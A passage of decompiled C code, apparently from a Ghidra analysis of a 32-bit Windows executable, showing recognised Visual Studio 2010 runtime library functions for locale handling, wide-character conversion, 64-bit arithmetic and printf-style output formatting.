    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2010 Release

LONG * __cdecl __updatetlocinfoEx_nolock(LONG **param_1,LONG *param_2)

{
  LONG *pLVar1;
  
  if ((param_2 == (LONG *)0x0) || (param_1 == (LONG **)0x0)) {
    param_2 = (LONG *)0x0;
  }
  else {
    pLVar1 = *param_1;
    if (pLVar1 != param_2) {
      *param_1 = param_2;
      ___addlocaleref(param_2);
      if (((pLVar1 != (LONG *)0x0) && (___removelocaleref(pLVar1), *pLVar1 == 0)) &&
         (pLVar1 != (LONG *)&DAT_00420c38)) {
        ___freetlocinfo(pLVar1);
      }
    }
  }
  return param_2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2010 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00420ac8) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    ptVar2 = (pthreadlocinfo)&p_Var1->ptlocinfo;
    __updatetlocinfoEx_nolock((LONG **)ptVar2,(LONG *)PTR_DAT_00420d10);
    FUN_00410ef0();
  }
  else {
    p_Var1 = __getptd();
    ptVar2 = p_Var1->ptlocinfo;
  }
  if (ptVar2 == (pthreadlocinfo)0x0) {
    __amsg_exit(0x20);
  }
  return ptVar2;
}



void FUN_00410ef0(void)

{
  FUN_004127a9(0xc);
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2010 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (0x2f < param_1) {
    if (param_1 < 0x3a) {
      return param_1 - 0x30;
    }
    iVar1 = 0xff10;
    if (param_1 < 0xff10) {
      iVar1 = 0x660;
      if (param_1 < 0x660) {
        return -1;
      }
      if (param_1 < 0x66a) goto LAB_00410f41;
      iVar1 = 0x6f0;
      if (param_1 < 0x6f0) {
        return -1;
      }
      if (param_1 < 0x6fa) goto LAB_00410f41;
      iVar1 = 0x966;
      if (param_1 < 0x966) {
        return -1;
      }
      if (param_1 < 0x970) goto LAB_00410f41;
      iVar1 = 0x9e6;
      if (param_1 < 0x9e6) {
        return -1;
      }
      if (param_1 < 0x9f0) goto LAB_00410f41;
      iVar1 = 0xa66;
      if (param_1 < 0xa66) {
        return -1;
      }
      if (param_1 < 0xa70) goto LAB_00410f41;
      iVar1 = 0xae6;
      if (param_1 < 0xae6) {
        return -1;
      }
      if (param_1 < 0xaf0) goto LAB_00410f41;
      iVar1 = 0xb66;
      if (param_1 < 0xb66) {
        return -1;
      }
      if (param_1 < 0xb70) goto LAB_00410f41;
      iVar1 = 0xc66;
      if (param_1 < 0xc66) {
        return -1;
      }
      if (param_1 < 0xc70) goto LAB_00410f41;
      iVar1 = 0xce6;
      if (param_1 < 0xce6) {
        return -1;
      }
      if (param_1 < 0xcf0) goto LAB_00410f41;
      iVar1 = 0xd66;
      if (param_1 < 0xd66) {
        return -1;
      }
      if (param_1 < 0xd70) goto LAB_00410f41;
      iVar1 = 0xe50;
      if (param_1 < 0xe50) {
        return -1;
      }
      if (param_1 < 0xe5a) goto LAB_00410f41;
      iVar1 = 0xed0;
      if (param_1 < 0xed0) {
        return -1;
      }
      if (param_1 < 0xeda) goto LAB_00410f41;
      iVar1 = 0xf20;
      if (param_1 < 0xf20) {
        return -1;
      }
      if (param_1 < 0xf2a) goto LAB_00410f41;
      iVar1 = 0x1040;
      if (param_1 < 0x1040) {
        return -1;
      }
      if (param_1 < 0x104a) goto LAB_00410f41;
      iVar1 = 0x17e0;
      if (param_1 < 0x17e0) {
        return -1;
      }
      if (param_1 < 0x17ea) goto LAB_00410f41;
      iVar1 = 0x1810;
      if (param_1 < 0x1810) {
        return -1;
      }
      uVar2 = 0x181a;
    }
    else {
      uVar2 = 0xff1a;
    }
    if (param_1 < uVar2) {
LAB_00410f41:
      return (uint)param_1 - iVar1;
    }
  }
  return -1;
}



// Library Function - Single Match
//  _iswctype
// 
// Library: Visual Studio 2010 Release

int __cdecl _iswctype(wint_t _C,wctype_t _Type)

{
  BOOL BVar1;
  ushort local_8 [2];
  
  if (_C != 0xffff) {
    if (_C < 0x100) {
      local_8[0] = *(ushort *)(PTR_DAT_00420ef0 + (uint)_C * 2);
    }
    else {
      BVar1 = GetStringTypeW(1,(LPCWSTR)&_C,1,local_8);
      if (BVar1 == 0) {
        local_8[0] = 0;
      }
    }
    return (uint)(local_8[0] & _Type);
  }
  return 0;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2010 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2010 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2010 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2010 Release

void __fastcall _write_string(int param_1,undefined param_2,undefined4 param_3)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  FILE *unaff_EDI;
  
  piVar2 = __errno();
  iVar1 = *piVar2;
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    piVar2 = __errno();
    *piVar2 = 0;
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar2 = __errno();
        if (*piVar2 != 0x2a) break;
        _write_char(unaff_EDI);
      }
    }
    piVar2 = __errno();
    if (*piVar2 == 0) {
      piVar2 = __errno();
      *piVar2 = iVar1;
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  FILE *pFVar1;
  int *piVar2;
  uint uVar3;
  code *pcVar4;
  errno_t eVar5;
  int iVar6;
  undefined *puVar7;
  int extraout_ECX;
  byte extraout_DL;
  byte extraout_DL_00;
  byte extraout_DL_01;
  byte bVar8;
  undefined uVar9;
  undefined extraout_DL_02;
  undefined4 extraout_EDX_00;
  undefined4 uVar10;
  int *piVar11;
  size_t sVar12;
  byte *pbVar13;
  bool bVar14;
  undefined8 uVar15;
  int **ppiVar16;
  int *piVar17;
  int *piVar18;
  localeinfo_struct *plVar19;
  int *local_27c;
  int *local_278;
  int local_274;
  undefined4 local_270;
  int *local_268;
  int local_264;
  int local_260;
  FILE *local_25c;
  int *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int **local_22c;
  int local_228;
  size_t local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined4 local_11;
  uint local_8;
  undefined4 extraout_EDX;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_25c = _File;
  local_22c = (int **)_ArgList;
  local_264 = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_260 = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  if (_File != (FILE *)0x0) {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar3 = __fileno(_File);
      if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {
        puVar7 = &DAT_00420450;
      }
      else {
        puVar7 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00423840)[(int)uVar3 >> 5]);
      }
      if ((puVar7[0x24] & 0x7f) == 0) {
        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {
          puVar7 = &DAT_00420450;
        }
        else {
          puVar7 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00423840)[(int)uVar3 >> 5]);
        }
        if ((puVar7[0x24] & 0x80) == 0) goto LAB_00411376;
      }
    }
    else {
LAB_00411376:
      if (_Format != (char *)0x0) {
        local_215 = *_Format;
        local_228 = 0;
        local_224 = 0;
        local_244 = 0;
        local_258 = (int *)0x0;
        if (local_215 != 0) {
          do {
            pbVar13 = (byte *)_Format + 1;
            local_240 = pbVar13;
            if (local_228 < 0) break;
            if ((byte)(local_215 - 0x20) < 0x59) {
              uVar3 = (byte)(&DAT_0041b190)[(char)local_215] & 0xf;
            }
            else {
              uVar3 = 0;
            }
            local_244 = (uint)((byte)(&DAT_0041b1b0)[local_244 + uVar3 * 9] >> 4);
            switch(local_244) {
            case 0:
switchD_00411403_caseD_0:
              local_23c = 0;
              iVar6 = __isleadbyte_l((uint)local_215,&local_254);
              if (iVar6 != 0) {
                _write_char(local_25c);
                local_240 = (byte *)_Format + 2;
                if (*pbVar13 == 0) goto switchD_00411403_caseD_9;
              }
              _write_char(local_25c);
              break;
            case 1:
              local_21c = (int *)0xffffffff;
              local_270 = 0;
              local_260 = 0;
              local_238 = (int *)0x0;
              local_234 = 0;
              local_214 = 0;
              local_23c = 0;
              break;
            case 2:
              if (local_215 == 0x20) {
                local_214 = local_214 | 2;
              }
              else if (local_215 == 0x23) {
                local_214 = local_214 | 0x80;
              }
              else if (local_215 == 0x2b) {
                local_214 = local_214 | 1;
              }
              else if (local_215 == 0x2d) {
                local_214 = local_214 | 4;
              }
              else if (local_215 == 0x30) {
                local_214 = local_214 | 8;
              }
              break;
            case 3:
              if (local_215 == 0x2a) {
                local_22c = (int **)((int)_ArgList + 4);
                local_238 = *(int **)_ArgList;
                if ((int)local_238 < 0) {
                  local_214 = local_214 | 4;
                  local_238 = (int *)-(int)local_238;
                }
              }
              else {
                local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
              }
              break;
            case 4:
              local_21c = (int *)0x0;
              break;
            case 5:
              if (local_215 == 0x2a) {
                local_22c = (int **)((int)_ArgList + 4);
                local_21c = *(int **)_ArgList;
                if ((int)local_21c < 0) {
                  local_21c = (int *)0xffffffff;
                }
              }
              else {
                local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
              }
              break;
            case 6:
              if (local_215 == 0x49) {
                bVar8 = *pbVar13;
                if ((bVar8 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
                  local_214 = local_214 | 0x8000;
                  local_240 = (byte *)_Format + 3;
                }
                else if ((bVar8 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
                  local_214 = local_214 & 0xffff7fff;
                  local_240 = (byte *)_Format + 3;
                }
                else if (((((bVar8 != 100) && (bVar8 != 0x69)) && (bVar8 != 0x6f)) &&
                         ((bVar8 != 0x75 && (bVar8 != 0x78)))) && (bVar8 != 0x58)) {
                  local_244 = 0;
                  goto switchD_00411403_caseD_0;
                }
              }
              else if (local_215 == 0x68) {
                local_214 = local_214 | 0x20;
              }
              else if (local_215 == 0x6c) {
                if (*pbVar13 == 0x6c) {
                  local_214 = local_214 | 0x1000;
                  local_240 = (byte *)_Format + 2;
                }
                else {
                  local_214 = local_214 | 0x10;
                }
              }
              else if (local_215 == 0x77) {
                local_214 = local_214 | 0x800;
              }
              break;
            case 7:
              bVar8 = local_215;
              if ((char)local_215 < 'e') {
                if (local_215 == 100) {
LAB_004118f1:
                  local_214 = local_214 | 0x40;
LAB_004118f8:
                  local_224 = 10;
LAB_00411902:
                  if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
                    local_22c = (int **)((int)_ArgList + 4);
                    if ((local_214 & 0x20) == 0) {
                      piVar2 = *(int **)_ArgList;
                      if ((local_214 & 0x40) == 0) {
                        piVar11 = (int *)0x0;
                      }
                      else {
                        piVar11 = (int *)((int)piVar2 >> 0x1f);
                      }
                    }
                    else {
                      if ((local_214 & 0x40) == 0) {
                        piVar2 = (int *)(uint)*(ushort *)_ArgList;
                      }
                      else {
                        piVar2 = (int *)(int)*(short *)_ArgList;
                      }
                      piVar11 = (int *)((int)piVar2 >> 0x1f);
                    }
                  }
                  else {
                    local_22c = (int **)((int)_ArgList + 8);
                    piVar2 = *(int **)_ArgList;
                    piVar11 = *(int **)((int)_ArgList + 4);
                  }
                  if ((((local_214 & 0x40) != 0) && ((int)piVar11 < 1)) && ((int)piVar11 < 0)) {
                    bVar14 = piVar2 != (int *)0x0;
                    piVar2 = (int *)-(int)piVar2;
                    piVar11 = (int *)-(int)((int)piVar11 + (uint)bVar14);
                    local_214 = local_214 | 0x100;
                  }
                  uVar15 = CONCAT44(piVar11,piVar2);
                  if ((local_214 & 0x9000) == 0) {
                    piVar11 = (int *)0x0;
                  }
                  if ((int)local_21c < 0) {
                    local_21c = (int *)0x1;
                  }
                  else {
                    local_214 = local_214 & 0xfffffff7;
                    if (0x200 < (int)local_21c) {
                      local_21c = (int *)0x200;
                    }
                  }
                  if (((uint)piVar2 | (uint)piVar11) == 0) {
                    local_234 = 0;
                  }
                  piVar2 = &local_11;
                  while( true ) {
                    piVar17 = piVar11;
                    bVar8 = (byte)((ulonglong)uVar15 >> 0x20);
                    piVar11 = (int *)((int)local_21c + -1);
                    if (((int)local_21c < 1) && (((uint)uVar15 | (uint)piVar17) == 0)) break;
                    local_21c = piVar11;
                    uVar15 = __aulldvrm((uint)uVar15,(uint)piVar17,local_224,(int)local_224 >> 0x1f)
                    ;
                    iVar6 = extraout_ECX + 0x30;
                    if (0x39 < iVar6) {
                      iVar6 = iVar6 + local_264;
                    }
                    *(char *)piVar2 = (char)iVar6;
                    piVar2 = (int *)((int)piVar2 + -1);
                    piVar11 = (int *)((ulonglong)uVar15 >> 0x20);
                    local_268 = piVar17;
                  }
                  local_224 = (int)&local_11 + -(int)piVar2;
                  local_220 = (int *)((int)piVar2 + 1);
                  local_21c = piVar11;
                  if (((local_214 & 0x200) != 0) &&
                     ((local_224 == 0 || (*(char *)local_220 != '0')))) {
                    *(char *)piVar2 = '0';
                    local_224 = (int)&local_11 + -(int)piVar2 + 1;
                    local_220 = piVar2;
                  }
                }
                else if ((char)local_215 < 'T') {
                  if (local_215 == 0x53) {
                    if ((local_214 & 0x830) == 0) {
                      local_214 = local_214 | 0x800;
                    }
                    goto LAB_00411720;
                  }
                  if (local_215 == 0x41) {
LAB_0041169e:
                    local_215 = local_215 + 0x20;
                    local_270 = 1;
LAB_004116b1:
                    local_214 = local_214 | 0x40;
                    local_268 = (int *)0x200;
                    piVar2 = local_210;
                    piVar11 = local_268;
                    piVar17 = local_210;
                    if ((int)local_21c < 0) {
                      local_21c = (int *)0x6;
                    }
                    else if (local_21c == (int *)0x0) {
                      if (local_215 == 0x67) {
                        local_21c = (int *)0x1;
                      }
                    }
                    else {
                      if (0x200 < (int)local_21c) {
                        local_21c = (int *)0x200;
                      }
                      if (0xa3 < (int)local_21c) {
                        piVar11 = (int *)((int)local_21c + 0x15d);
                        local_220 = local_210;
                        local_258 = (int *)__malloc_crt((size_t)piVar11);
                        piVar2 = local_258;
                        piVar17 = local_258;
                        if (local_258 == (int *)0x0) {
                          local_21c = (int *)0xa3;
                          piVar2 = local_210;
                          piVar11 = local_268;
                          piVar17 = local_220;
                        }
                      }
                    }
                    local_220 = piVar17;
                    local_268 = piVar11;
                    local_27c = *(int **)_ArgList;
                    local_22c = (int **)((int)_ArgList + 8);
                    local_278 = *(int **)((int)_ArgList + 4);
                    plVar19 = &local_254;
                    iVar6 = (int)(char)local_215;
                    ppiVar16 = &local_27c;
                    piVar11 = piVar2;
                    piVar17 = local_268;
                    piVar18 = local_21c;
                    uVar10 = local_270;
                    pcVar4 = (code *)DecodePointer(PTR_LAB_00420e68);
                    (*pcVar4)(ppiVar16,piVar11,piVar17,iVar6,piVar18,uVar10,plVar19);
                    uVar3 = local_214 & 0x80;
                    if ((uVar3 != 0) && (local_21c == (int *)0x0)) {
                      plVar19 = &local_254;
                      piVar11 = piVar2;
                      pcVar4 = (code *)DecodePointer(PTR_LAB_00420e74);
                      (*pcVar4)(piVar11,plVar19);
                    }
                    if ((local_215 == 0x67) && (uVar3 == 0)) {
                      plVar19 = &local_254;
                      piVar11 = piVar2;
                      pcVar4 = (code *)DecodePointer(PTR_LAB_00420e70);
                      (*pcVar4)(piVar11,plVar19);
                    }
                    if (*(char *)piVar2 == '-') {
                      local_214 = local_214 | 0x100;
                      piVar2 = (int *)((int)piVar2 + 1);
                      local_220 = piVar2;
                    }
LAB_00411853:
                    local_224 = _strlen((char *)piVar2);
                    bVar8 = extraout_DL_00;
                  }
                  else if (local_215 == 0x43) {
                    if ((local_214 & 0x830) == 0) {
                      local_214 = local_214 | 0x800;
                    }
LAB_00411793:
                    local_22c = (int **)((int)_ArgList + 4);
                    if ((local_214 & 0x810) == 0) {
                      local_210[0]._0_1_ = *_ArgList;
                      local_224 = 1;
                    }
                    else {
                      eVar5 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,
                                        *(wchar_t *)_ArgList);
                      bVar8 = extraout_DL;
                      if (eVar5 != 0) {
                        local_260 = 1;
                        bVar8 = extraout_DL;
                      }
                    }
                    local_220 = local_210;
                  }
                  else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_0041169e;
                }
                else {
                  if (local_215 == 0x58) goto LAB_00411a4b;
                  if (local_215 == 0x5a) {
                    piVar2 = *(int **)_ArgList;
                    local_22c = (int **)((int)_ArgList + 4);
                    if ((piVar2 == (int *)0x0) ||
                       (local_220 = (int *)piVar2[1], local_220 == (int *)0x0)) {
                      local_220 = (int *)PTR_DAT_00420d24;
                      piVar2 = (int *)PTR_DAT_00420d24;
                      goto LAB_00411853;
                    }
                    local_224 = (size_t)*(wchar_t *)piVar2;
                    if ((local_214 & 0x800) == 0) {
                      local_23c = 0;
                    }
                    else {
                      local_224 = (int)local_224 / 2;
                      local_23c = 1;
                      bVar8 = (byte)(*(wchar_t *)piVar2 >> 7);
                    }
                  }
                  else {
                    if (local_215 == 0x61) goto LAB_004116b1;
                    if (local_215 == 99) goto LAB_00411793;
                  }
                }
LAB_00411c25:
                if (local_260 == 0) {
                  if ((local_214 & 0x40) != 0) {
                    if ((local_214 & 0x100) == 0) {
                      if ((local_214 & 1) == 0) {
                        if ((local_214 & 2) == 0) goto LAB_00411c6e;
                        local_230 = 0x20;
                      }
                      else {
                        local_230 = 0x2b;
                      }
                    }
                    else {
                      local_230 = 0x2d;
                    }
                    local_234 = 1;
                  }
LAB_00411c6e:
                  piVar11 = (int *)((int)local_238 + (-local_234 - local_224));
                  local_268 = piVar11;
                  piVar2 = piVar11;
                  if ((local_214 & 0xc) == 0) {
                    do {
                      if ((int)piVar2 < 1) break;
                      piVar2 = (int *)((int)piVar2 + -1);
                      _write_char(local_25c);
                      bVar8 = extraout_DL_01;
                    } while (local_228 != -1);
                  }
                  pFVar1 = local_25c;
                  _write_string(local_234,bVar8,&local_230);
                  uVar9 = (undefined)extraout_EDX;
                  if (((local_214 & 8) != 0) && (uVar10 = extraout_EDX, (local_214 & 4) == 0)) {
                    do {
                      uVar9 = (undefined)uVar10;
                      if ((int)piVar11 < 1) break;
                      piVar11 = (int *)((int)piVar11 + -1);
                      _write_char(pFVar1);
                      uVar9 = (undefined)extraout_EDX_00;
                      uVar10 = extraout_EDX_00;
                    } while (local_228 != -1);
                  }
                  if ((local_23c == 0) ||
                     (sVar12 = local_224, piVar2 = local_220, (int)local_224 < 1)) {
                    _write_string(local_224,uVar9,local_220);
                  }
                  else {
                    do {
                      sVar12 = sVar12 - 1;
                      eVar5 = _wctomb_s(&local_274,(char *)((int)&local_11 + 1),6,*(wchar_t *)piVar2
                                       );
                      if ((eVar5 != 0) || (local_274 == 0)) {
                        local_228 = -1;
                        break;
                      }
                      _write_string(local_274,extraout_DL_02,(int)&local_11 + 1);
                      piVar2 = (int *)((int)piVar2 + 2);
                    } while (sVar12 != 0);
                  }
                  if ((-1 < local_228) && (piVar2 = local_268, (local_214 & 4) != 0)) {
                    do {
                      if ((int)piVar2 < 1) break;
                      _write_char(pFVar1);
                      piVar2 = (int *)((int)piVar2 + -1);
                    } while (local_228 != -1);
                  }
                }
              }
              else {
                if ('p' < (char)local_215) {
                  if (local_215 == 0x73) {
LAB_00411720:
                    piVar2 = local_21c;
                    if (local_21c == (int *)0xffffffff) {
                      piVar2 = (int *)0x7fffffff;
                    }
                    local_22c = (int **)((int)_ArgList + 4);
                    local_220 = *(int **)_ArgList;
                    if ((local_214 & 0x810) == 0) {
                      piVar11 = local_220;
                      if (local_220 == (int *)0x0) {
                        local_220 = (int *)PTR_DAT_00420d24;
                        piVar11 = (int *)PTR_DAT_00420d24;
                      }
                      for (; (piVar2 != (int *)0x0 &&
                             (piVar2 = (int *)((int)piVar2 + -1), *(char *)piVar11 != '\0'));
                          piVar11 = (int *)((int)piVar11 + 1)) {
                      }
                      local_224 = (int)piVar11 - (int)local_220;
                    }
                    else {
                      if (local_220 == (int *)0x0) {
                        local_220 = (int *)PTR_u__null__00420d28;
                      }
                      local_23c = 1;
                      for (piVar11 = local_220;
                          (piVar2 != (int *)0x0 &&
                          (piVar2 = (int *)((int)piVar2 + -1), *(wchar_t *)piVar11 != L'\0'));
                          piVar11 = (int *)((int)piVar11 + 2)) {
                      }
                      local_224 = (int)piVar11 - (int)local_220 >> 1;
                    }
                    goto LAB_00411c25;
                  }
                  if (local_215 == 0x75) goto LAB_004118f8;
                  if (local_215 != 0x78) goto LAB_00411c25;
                  local_264 = 0x27;
LAB_00411a77:
                  local_224 = 0x10;
                  if ((local_214 & 0x80) != 0) {
                    local_22f = (char)local_264 + 'Q';
                    local_230 = 0x30;
                    local_234 = 2;
                  }
                  goto LAB_00411902;
                }
                if (local_215 == 0x70) {
                  local_21c = (int *)0x8;
LAB_00411a4b:
                  local_264 = 7;
                  goto LAB_00411a77;
                }
                if ((char)local_215 < 'e') goto LAB_00411c25;
                if ((char)local_215 < 'h') goto LAB_004116b1;
                if (local_215 == 0x69) goto LAB_004118f1;
                if (local_215 != 0x6e) {
                  if (local_215 != 0x6f) goto LAB_00411c25;
                  local_224 = 8;
                  if ((local_214 & 0x80) != 0) {
                    local_214 = local_214 | 0x200;
                  }
                  goto LAB_00411902;
                }
                piVar2 = *(int **)_ArgList;
                local_22c = (int **)((int)_ArgList + 4);
                iVar6 = __get_printf_count_output();
                if (iVar6 == 0) goto switchD_00411403_caseD_9;
                if ((local_214 & 0x20) == 0) {
                  *piVar2 = local_228;
                }
                else {
                  *(wchar_t *)piVar2 = (wchar_t)local_228;
                }
                local_260 = 1;
              }
              if (local_258 != (int *)0x0) {
                _free(local_258);
                local_258 = (int *)0x0;
              }
              break;
            default:
              goto switchD_00411403_caseD_9;
            case 0xbad1abe1:
              break;
            }
            local_215 = *local_240;
            _ArgList = (va_list)local_22c;
            _Format = (char *)local_240;
          } while (local_215 != 0);
          if ((local_244 != 0) && (local_244 != 7)) goto switchD_00411403_caseD_9;
        }
        if (local_248 != '\0') {
          *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
        }
        goto LAB_00411e1b;
      }
    }
  }
switchD_00411403_caseD_9:
  piVar2 = __errno();
  *piVar2 = 0x16;
  FUN_0040c664();
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_00411e1b:
  iVar6 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2010 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  
  if (0 < _CchSrc) {
    _CchSrc = _wcsnlen(_LpSrcStr,_CchSrc);
  }
  iVar1 = LCMapStringW((LCID)_LocaleName,_DWMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,_CchDest);
  return iVar1;
}



// Library Function - Single Match
//  _wcsnlen
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _wcsnlen(wchar_t *_Src,size_t _MaxCount)

{
  uint uVar1;
  
  uVar1 = 0;
  if (_MaxCount != 0) {
    do {
      if (*_Src == L'\0') {
        return uVar1;
      }
      uVar1 = uVar1 + 1;
      _Src = _Src + 1;
    } while (uVar1 < _MaxCount);
  }
  return uVar1;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2010 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2010 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  WCHAR WVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  int local_18 [2];
  int local_10;
  char local_c;
  WCHAR local_8 [2];
  
  WVar1 = L'\xffff';
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_18,_Locale);
    if (*(LPCWSTR *)(local_18[0] + 0x14) == (LPCWSTR)0x0) {
      WVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        WVar1 = _C + L' ';
      }
    }
    else if (_C < 0x100) {
      iVar2 = _iswctype(_C,1);
      WVar1 = _C;
      if (iVar2 != 0) {
        WVar1 = (ushort)*(byte *)(*(int *)(local_18[0] + 0xcc) + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW(*(LPCWSTR *)(local_18[0] + 0x14),0x100,(LPCWSTR)&_C,1,local_8,1);
      WVar1 = _C;
      if (iVar2 != 0) {
        WVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return WVar1;
}



// Library Function - Single Match
//  __VEC_memcpy
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2010 Release

undefined4 * __fastcall __VEC_memcpy(uint param_1)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  uint uVar17;
  undefined4 *unaff_ESI;
  undefined4 *unaff_EDI;
